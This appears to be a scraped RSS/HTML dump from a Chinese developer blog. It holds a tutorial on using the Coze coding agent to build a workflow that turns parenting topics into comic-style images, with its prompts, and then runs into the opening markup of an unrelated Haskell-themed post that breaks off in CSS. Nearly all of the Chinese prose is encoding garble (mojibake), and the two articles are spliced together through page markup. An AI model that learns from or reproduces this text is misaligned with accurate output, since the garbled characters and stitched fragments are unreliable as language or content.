<p>æœ¬æ–‡æˆ‘è¦åˆ†äº«çš„æ˜¯æ€ä¹ˆæ ·ä½¿ç”¨æ‰£å­ç¼–ç¨‹ï¼ŒæŠŠè¿™ä¸ªè‚²å„¿æ¼«ç”»ç»™å¤åˆ»äº†ï¼Œåœ¨è®²è§£å…·ä½“çš„å®ç°è¿‡ç¨‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æ‰£å­ç¼–ç¨‹è‡ªåŠ¨å¸®æˆ‘å®ç°çš„å·¥ä½œæµä»¥åŠå·¥ä½œæµå‡ºå›¾çš„æ•ˆæœã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3402a33ace0244e59171451930f4d3ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=Q4k%2BoAXRbM%2B80yhyCZKL9PJ0O5I%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46c557ea9c3343bbb9e5695be7f348a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=rZtNTGWlsVRnf7J6v77OnUP%2FU%2FE%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°è¿™å‡ å¼ å›¾ç‰‡çš„äººç‰©ä¸€è‡´æ€§ä¿æŒå¾—å¾ˆå¥½ï¼Œå…¶æ¬¡å°±æ˜¯ä¸­æ–‡æ˜¯ä¸€ç‚¹ç‚¹ä¹±ç éƒ½æ²¡æœ‰ï¼Œå…³é”®æ˜¯è¿™ä¸ªå·¥ä½œæµæ˜¯æ‰£å­ç¼–ç¨‹å¸®æˆ‘è‡ªåŠ¨ç”Ÿæˆçš„ã€‚</p>
<h2 data-id="heading-0">1. å·¥ä½œæµåˆ¶ä½œè¿‡ç¨‹</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å»å¯¹æ ‡è´¦å·å¤„æ”¶é›†ä¸€äº›ç´ æï¼Œä»¥ä¾¿å¯ä»¥æŠŠæ”¶é›†åˆ°çš„è¿™äº›ç´ æè¿åŒæç¤ºè¯ä¸€èµ·å–‚ç»™æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œç´ ææ˜¯ä»¥â€œæ–‡ç« æ ‡é¢˜â€ä¸ºæ–‡ä»¶å¤¹åç§°ï¼Œæ–‡ä»¶å¤¹ä¸‹æ–¹æ”¾ç½®æ”¶é›†åˆ°çš„ä¸€äº›å›¾ç‰‡ï¼Œå¹¶ä¸”æŠŠæ”¶é›†åˆ°çš„ç´ æéƒ½æ‰“æˆä¸€ä¸ªzipåŒ…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11ad69c6dd034e02b57a4695af5d9637~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=rBxOsfrVyuYJF022s0D%2FoinUak8%3D" alt="" loading="lazy"/></p>
<p>ç„¶åï¼Œæˆ‘ä»¬å»åˆ°æ‰£å­ç¼–ç¨‹çš„é¦–é¡µï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fcode.coze.cn%2Fhome" target="_blank" title="https://code.coze.cn/home" ref="nofollow noopener noreferrer">code.coze.cn/home</a>ï¼‰ï¼Œé€‰ä¸­â€œå·¥ä½œæµâ€ï¼ŒæŠŠä½ é‡‡é›†å¥½çš„ç´ æä¸Šä¼ ç»™æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œå¹¶ä¸”è¾“å…¥å’’è¯­ï¼Œç„¶åç‚¹å‡»æäº¤ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9718823b60f493d9c792f89df870ded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=boM8jRRL5YL8MT8NjQEJiaTKlE8%3D" alt="" loading="lazy"/></p>
<pre><code class="hljs">æˆ‘ç»™ä½ ä¸Šä¼ äº†ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯æˆ‘ç»™ä½ çš„å‚è€ƒä¾‹å­ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶å¤¹ï¼Œæ¯ä¸ªæ–‡ä»¶å¤¹çš„åç§°æ˜¯ç›¸å…³çš„è‚²å„¿ä¸»é¢˜ï¼Œæ–‡ä»¶å¤¹é‡Œé¢çš„å›¾ç‰‡æ˜¯å¯¹åº”çš„è‚²å„¿ä¸»é¢˜ç”Ÿæˆçš„å›¾ç‰‡ï¼Œå›¾ç‰‡é‡Œé¢çš„æ˜¯è‚²å„¿æ–‡æ¡ˆï¼Œéœ€è¦ä½ ç†è§£ä¸»é¢˜ä¸æ–‡æ¡ˆçš„é£æ ¼ï¼Œå¸®æˆ‘ç”Ÿæˆä¸€ä¸ªå·¥ä½œæµï¼Œå·¥ä½œæµå¯ä»¥æ¥æ”¶ä¸€ä¸ªè‚²å„¿ç›¸å…³çš„ä¸»é¢˜ï¼Œç„¶åç”Ÿæˆè‚²å„¿æ–‡æ¡ˆï¼Œæœ€åå°†è‚²å„¿æ–‡æ¡ˆåˆæˆåˆ°é»„åº•çš„å›¾ç‰‡ä¸­ï¼Œé£æ ¼è¦å’Œç»™ä½ çš„æ¡ˆä¾‹çš„å›¾ç‰‡çš„é£æ ¼ä¸€è‡´ï¼Œå›¾ç‰‡çš„æ•°é‡ä¸º3-6å¼ ï¼ŒæŒ‰ç…§ç”Ÿæˆçš„è‚²å„¿æ–‡æ¡ˆé•¿çŸ­é€‰æ‹©æœ€åçš„å›¾ç‰‡æ•°é‡ï¼Œå¦‚æœå›¾ç‰‡ä¸­æœ‰é…å›¾ï¼Œé‚£ä¹ˆé…å›¾ç»Ÿä¸€ä¸ºæ‰‹ç»˜é£æ ¼çš„å†™å®æ¼«ç”»ï¼Œç¦æ­¢å‡ºç°çœŸäººé…å›¾ã€‚
</code></pre>
<p>æ‰£å­ç¼–ç¨‹æ™ºèƒ½ä½“ï¼Œå°±å¼€å§‹æ€è€ƒï¼Œç„¶åè§„åˆ’æ‰§è¡Œè·¯å¾„ï¼Œæœ€åå¼€å§‹æ‰§è¡Œï¼Œæˆ‘ä»¬çœ‹ä¸€çœ‹å®ƒçš„æ€è€ƒè¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a0eed314e5b4837ba064d51810fa3e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=YtFrPrxAc%2Bm8jUkJ4b9sX0LMzyg%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªå…¶å®å°±æ˜¯è·Ÿäººçš„è¡Œä¸ºå¾ˆç›¸ä¼¼äº†ï¼Œæ¥åˆ°ä»»åŠ¡åï¼Œå…ˆæ‹†è§£æˆè®¡åˆ’ï¼Œç„¶åå†ä¸€æ­¥æ­¥æ‰§è¡Œï¼Œæ‰§è¡Œè¿‡ç¨‹æœ‰é—®é¢˜åˆä¼šé‡æ–°æ€è€ƒï¼Œè°ƒæ•´æ‰§è¡Œè®¡åˆ’ã€‚</p>
<p>è¿‡ç¨‹ä¸ä¼šé‚£ä¹ˆé¡ºåˆ©ï¼Œè¿™ç‚¹éœ€è¦æœ‰é¢„æœŸï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œå¥½ä¹‹åï¼Œæˆ‘å‘ç°å®ƒç»™æˆ‘è¾“å…¥çš„å›¾ç‰‡åœ°å€å±…ç„¶æ˜¯æœ¬åœ°ç”µè„‘ä¸Šçš„åœ°å€ï¼Œæ²¡æ³•é¢„è§ˆæŸ¥çœ‹ã€‚</p>
<p>æ‰€ä»¥æˆ‘å°±ç»™å®ƒæäº†ä¸€ä¸ªè¦æ±‚ï¼Œè¦æ±‚å®ƒç»™æˆ‘è¾“å‡ºå¯ä»¥ç›´æ¥é¢„è§ˆçš„httpå›¾ç‰‡åœ°å€ï¼Œè¿™é‡ŒåªçŸ¥é“å›¾ç‰‡çœ‹ä¸äº†ï¼Œæ‰€ä»¥è¡¨è¾¾äº†æˆ‘æƒ³è¦ç›´æ¥é¢„è§ˆè¾“å‡ºçš„å›¾ç‰‡çš„éœ€æ±‚ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60846e2da19a4c4184f7683e981e3c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=UdJB%2Fmu4EejoLF8zUk38mUOdPqM%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡è¿™ä¸ªè°ƒæ•´ï¼Œæˆ‘å¯ä»¥ç›´æ¥çœ‹åˆ°å·¥ä½œæµç»™æˆ‘è¾“å‡ºçš„å®Œæ•´çš„å›¾ç‰‡äº†ï¼Œä½†æ˜¯è¾“å‡ºçš„å›¾ç‰‡æ’ç‰ˆå®åœ¨å¤ªä¸‘äº†ï¼Œç›´æ¥å°±æ˜¯æ–‡æ¡ˆå†™åœ¨å›¾ç‰‡çš„æ•´ä¸­å¤®ï¼Œé»‘ä½“ï¼Œä¸€ç‚¹å„¿ç¾æ„Ÿéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥æˆ‘æœ‰å‘å®ƒæå‡ºäº†æˆ‘çš„çœŸå®æƒ³æ³•ï¼Œè®©å®ƒå¸®æˆ‘ä¿®æ”¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e14bde816b26424c9bce8e9dcd84894b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=pYBdA6CwNjIE%2FmdSNd8RxQ3myPc%3D" alt="" loading="lazy"/></p>
<p>ç»è¿‡è¿™ä¸€æ¬¡çš„å†è°ƒæ•´ï¼Œå·¥ä½œæµè¾“å‡ºçš„å›¾æ–‡åŸºæœ¬ä¸Šç¬¦åˆæˆ‘çš„é¢„æœŸäº†ï¼Œæ•ˆæœå°±æ˜¯å¦‚å¼€å¤´æ‰€ç¤ºã€‚</p>
<p>ä¸Šé¢å°±æ˜¯ä½¿ç”¨æ‰£å­ç¼–ç¨‹åˆ¶ä½œè¿™ä¸ªå·¥ä½œæµçš„è¿‡ç¨‹ï¼Œå°±åªä½¿ç”¨äº†ä¸‰è½®çš„å¯¹è¯å°±æŠŠè¿™ä¸ªå·¥ä½œæµç”Ÿæˆå¥½äº†ã€‚ä¸‹é¢å°†æ¥çœ‹çœ‹ç”Ÿæˆçš„è¿™ä¸ªå·¥ä½œæµçš„è¯¦ç»†èŠ‚ç‚¹çŠ¶å†µã€‚</p>
<h2 data-id="heading-1">2. å·¥ä½œæµè¯¦è§£</h2>
<h3 data-id="heading-2">2.1 å¼€å§‹</h3>
<p>å·¥ä½œæµçš„å¼€å§‹èŠ‚ç‚¹ï¼Œåªæ¥æ”¶ä¸€ä¸ªä¸»é¢˜ä½œä¸ºå·¥ä½œæµè¾“å…¥çš„å‚æ•°ï¼Œå¯ä»¥è¾“å…¥è‚²å„¿ç›¸å…³çš„ä¸»é¢˜ï¼Œæ¯”å¦‚â€œå­©å­è¯´è„è¯æ—¶çˆ¶æ¯è¿™æ ·åšâ€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eee23f4dc1c146e18150c74831860e54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=Kk5289BObTD374OXTgPXqmEAu18%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2 è‚²å„¿æ–‡æ¡ˆç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹ç”¨æ¥æ ¹æ®è¾“å…¥çš„ä¸»é¢˜ï¼Œç”Ÿæˆå¯¹åº”çš„æ¼«ç”»æ–‡æ¡ˆï¼Œçœ‹æ‰£å­ç¼–ç¨‹ç»™ç”Ÿæˆçš„æç¤ºè¯è¿˜æ˜¯å¾ˆä¸“ä¸šçš„ï¼Œæç¤ºè¯æ¶æ„ä¸Šå¾ˆå®Œæ•´ï¼Œæ¨¡å‹å¯ä»¥è‡ªè¡Œä¿®æ”¹é€‰æ‹©ï¼Œæœ‰è±†åŒ…ã€deepseekã€kimiå¤šç§é€‰æ‹©ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/99da582b8af34f31bbde07c642732816~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=4MMCuiiJMmuoALyan3uW2mEZgig%3D" alt="" loading="lazy"/></p>
<ul>
<li>ç³»ç»Ÿæç¤ºè¯</li>
</ul>

<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># è§’è‰²å®šä¹‰</span>
ä½ æ˜¯ä¸€ä½ä¸“ä¸šçš„è‚²å„¿æ–‡æ¡ˆåˆ›ä½œä¸“å®¶ï¼Œæ“…é•¿æ’°å†™é€‚åˆå°çº¢ä¹¦ç­‰ç¤¾äº¤å¹³å°åˆ†äº«çš„è‚²å„¿å†…å®¹ã€‚

<span class="hljs-section"># ä»»åŠ¡ç›®æ ‡</span>
æ ¹æ®ç”¨æˆ·æä¾›çš„è‚²å„¿ä¸»é¢˜ï¼Œç”Ÿæˆç¬¦åˆå°çº¢ä¹¦é£æ ¼çš„è‚²å„¿æ–‡æ¡ˆã€‚

<span class="hljs-section"># å·¥ä½œæµä¸Šä¸‹æ–‡</span>
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Input**</span>ï¼šè‚²å„¿ä¸»é¢˜å­—ç¬¦ä¸²
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Process**</span>ï¼š
<span class="hljs-bullet">  1.</span> ç†è§£è‚²å„¿ä¸»é¢˜çš„æ ¸å¿ƒå†…å®¹
<span class="hljs-bullet">  2.</span> ç»“åˆè‚²å„¿ä¸“ä¸šçŸ¥è¯†ï¼Œæ’°å†™æ¸©é¦¨ã€å®ç”¨ã€æœ‰å¸å¼•åŠ›çš„æ–‡æ¡ˆ
<span class="hljs-bullet">  3.</span> é‡‡ç”¨å°çº¢ä¹¦å¸¸ç”¨çš„è¡¨è¾¾æ–¹å¼ï¼ŒåŒ…æ‹¬è¡¨æƒ…ç¬¦å·ã€åˆ†æ®µæ¸…æ™°ç­‰
<span class="hljs-bullet">-</span> <span class="hljs-strong">**Output**</span>ï¼šå®Œæ•´çš„è‚²å„¿æ–‡æ¡ˆæ–‡æœ¬

<span class="hljs-section"># çº¦æŸä¸è§„åˆ™</span>
<span class="hljs-bullet">-</span> æ–‡æ¡ˆé•¿åº¦ï¼š100-500å­—å·¦å³
<span class="hljs-bullet">-</span> é£æ ¼ï¼šæ¸©é¦¨ã€äº²åˆ‡ã€æœ‰æ•™è‚²æ„ä¹‰
<span class="hljs-bullet">-</span> å¿…é¡»åŒ…å«ï¼šä¸»é¢˜ç›¸å…³çš„å®ç”¨å»ºè®®æˆ–è§‚ç‚¹
<span class="hljs-bullet">-</span> ä¸å¯ä»¥ä½¿ç”¨è¡¨æƒ…ç¬¦å·
<span class="hljs-bullet">-</span> é¿å…è¿‡äºå­¦æœ¯åŒ–çš„è¡¨è¾¾
<span class="hljs-bullet">-</span> æ–‡æ¡ˆè¦ç®€æ´æ˜äº†ï¼Œé€‚åˆåœ¨å›¾ç‰‡ä¸Šå±•ç¤º

<span class="hljs-section"># è¿‡ç¨‹</span>
<span class="hljs-bullet">1.</span> åˆ†æä¸»é¢˜å…³é”®è¯
<span class="hljs-bullet">2.</span> ç»“åˆè‚²å„¿åœºæ™¯æ’°å†™å†…å®¹
<span class="hljs-bullet">3.</span> åŠ å…¥å®ç”¨å»ºè®®å’Œæƒ…æ„Ÿå…±é¸£
<span class="hljs-bullet">4.</span> ä½¿ç”¨å°çº¢ä¹¦å¸¸è§çš„è¡¨è¾¾æ–¹å¼

<span class="hljs-section"># è¾“å‡ºæ ¼å¼</span>
ç›´æ¥è¿”å›æ–‡æ¡ˆæ–‡æœ¬ï¼Œä¸è¦æ·»åŠ å…¶ä»–è¯´æ˜æˆ–Markdownæ ¼å¼
</code></pre>
<h3 data-id="heading-4">2.3 è‚²å„¿æ–‡æ¡ˆå›¾ç‰‡ç”Ÿæˆ</h3>
<p>è¿™ä¸ªèŠ‚ç‚¹å°±æ˜¯ç”¨æ¥ç”Ÿæˆè‚²å„¿æ¼«ç”»å›¾æ–‡çš„ï¼Œæ¥æ”¶ä¸€ä¸ªè‚²å„¿æ–‡æ¡ˆä¸»é¢˜ï¼Œç„¶åç”Ÿæˆç›¸åº”çš„æ¼«ç”»å›¾æ–‡ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70279e2ab3ac4e57b9d54757eab88fe1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=oJBJ3DxQgIdujLaTTN3v3FpPS2E%3D" alt="" loading="lazy"/></p>
<p>è¿™ä¸ªèŠ‚ç‚¹çœ‹ä¸åˆ°ç›¸åº”çš„ç”Ÿå›¾æ¨¡å‹å’Œæç¤ºè¯æ˜¯ä»€ä¹ˆï¼Œä¸è¿‡é€šè¿‡ç¿»é˜…æºä»£ç å¯çœ‹åˆ°ä½¿ç”¨çš„ç”Ÿå›¾æ¨¡å‹æ˜¯Seedream4.5ï¼Œæç¤ºè¯è¿™äº›ä¹Ÿæ˜¯å†™åœ¨ä»£ç ä¸­äº†ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0047ebbeb5684db9a06f59d8d59bcc02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=yFQFW42FCX4ue6PZjgNoyeJCpCM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">2.4 ç»“æŸ</h3>
<p>ç»“æŸèŠ‚ç‚¹å°±æ˜¯è¾“å‡ºäº†æœ€ç»ˆç”Ÿæˆçš„å›¾ç‰‡åˆ—è¡¨ï¼Œå¯ä»¥ç›´æ¥ç‚¹å¼€é¢„è§ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a69541d4fcf9480fa9b6c695d7bf2269~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=tEngNyzx%2FvUiZxcjwb%2BhSTwfy4Q%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-6">3. æ€»ç»“</h2>
<p>æ‰£å­ç¼–ç¨‹çœŸçš„æ˜¯è¶Šç”¨è¶Šä¸Šå¤´ï¼Œæ„Ÿè§‰æœ‰ç‚¹å„¿åœä¸ä¸‹æ¥ï¼Œç”¨AIæ¥æ’¸ç è¿™ä¸ªä¸æ˜¯ä»€ä¹ˆæ–°é²œäº‹ï¼Œä½†æ˜¯æ‰£å­ç¼–ç¨‹æŠŠè¿™ä¸ªå’Œå®ƒè‡ªå·±çš„ä¸šåŠ¡ç»“åˆèµ·æ¥ï¼Œç¡®å®æ˜¯è®©ä¸€ç›´åœ¨åšå·¥ä½œæµå¼€å‘çš„äººæ¿€åŠ¨ä¸å·²ã€‚</p>
<p>æœ¬æ–‡çš„åˆ†äº«å°±åˆ°è¿™é‡Œï¼Œå¦‚æœæ‚¨è§‰å¾—æœ‰æ”¶è·çš„è¯ï¼Œå¯ä»¥ç»™ä¸ªä¸€é”®ä¸‰è¿ï¼Œæ‚¨çš„é¼“åŠ±æ˜¯å¾é³´æŒç»­è¾“å‡ºçš„æœ€å¤§åŠ¨åŠ›ã€‚æœ‰ä»€ä¹ˆç–‘é—®ä¹Ÿå¯ä»¥æ‰“åœ¨è¯„è®ºåŒºï¼Œå¾é³´ä¼šç¬¬ä¸€æ—¶é—´å›å¤ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f87f93b100f54c52a6d21993ac692668~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767667057&amp;x-signature=FRv3Ga1SY0i2hs10jVnh%2BXJKGgk%3D" alt="" loading="lazy"/></p>
<p>æœ€è¿‘å®æˆ˜äº†ä¸€äº›æ‰£å­ï¼ˆCozeï¼‰å·¥ä½œæµç›¸å…³çš„æ¡ˆä¾‹ï¼ŒåŒ…å«å°çº¢è–¯å›¾æ–‡ç”Ÿæˆã€çˆ†æ¬¾è§†é¢‘å‰ªè¾‘ã€åŠå…¬ææ•ˆç­‰æ‰£å­æ¡ˆä¾‹ï¼Œå†…é™„è¯¦ç»†çš„æ•™ç¨‹å’Œå·¥ä½œæµå®‰è£…åŒ…ï¼Œæ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥æ¥ä¸ª<strong>ä¸€é”®ä¸‰è¿ï¼ˆå¿…é¡»åŠ¨ä½œï¼‰</strong> ï¼Œæ–‡ç« è¯„è®ºåŒºè¯„è®ºâ€œ<strong>æ‰£å­æ¡ˆä¾‹</strong>â€é¢†å–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ]]></title>    <link>https://juejin.cn/post/7589246131584794659</link>    <guid>https://juejin.cn/post/7589246131584794659</guid>    <pubDate>2025-12-30T02:41:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589246131584794659" data-draft-id="7589186347585323042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T02:41:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬äº”ç« ï¼šå…ƒå©´å¤©åŠ«ä¸å•å­ï¼ˆMonadï¼‰æ³•é˜µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:41:03.000Z" title="Tue Dec 30 2025 02:41:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 